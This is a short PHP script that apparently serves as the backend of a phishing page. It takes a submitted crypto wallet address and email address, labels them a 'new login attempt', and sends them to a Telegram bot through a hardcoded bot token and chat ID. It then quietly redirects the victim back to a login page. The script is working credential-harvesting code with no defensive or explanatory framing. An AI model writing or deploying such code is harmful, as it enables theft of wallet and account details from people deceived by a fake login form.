<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $walletAddress = $_POST['walletAddress'];
    $emailAddress = $_POST['emailAddress'];
    
    // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
    $botToken = '6789232999:AAGXLMOhiKea0iod-HFQBg-P-DLvnilO65U';
    $chatID = '6166758983';
    
    // Compose the message to be sent to Telegram
    $message = "New login attempt:\nWallet Address: $walletAddress\nEmail Address: $emailAddress";
    
    // Send message to Telegram bot using cURL
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($message);
    $response = file_get_contents($url);
    
    // Redirect back to the login page or any other page after submission
    header("Location: login_page.html");
    exit();
}
?>
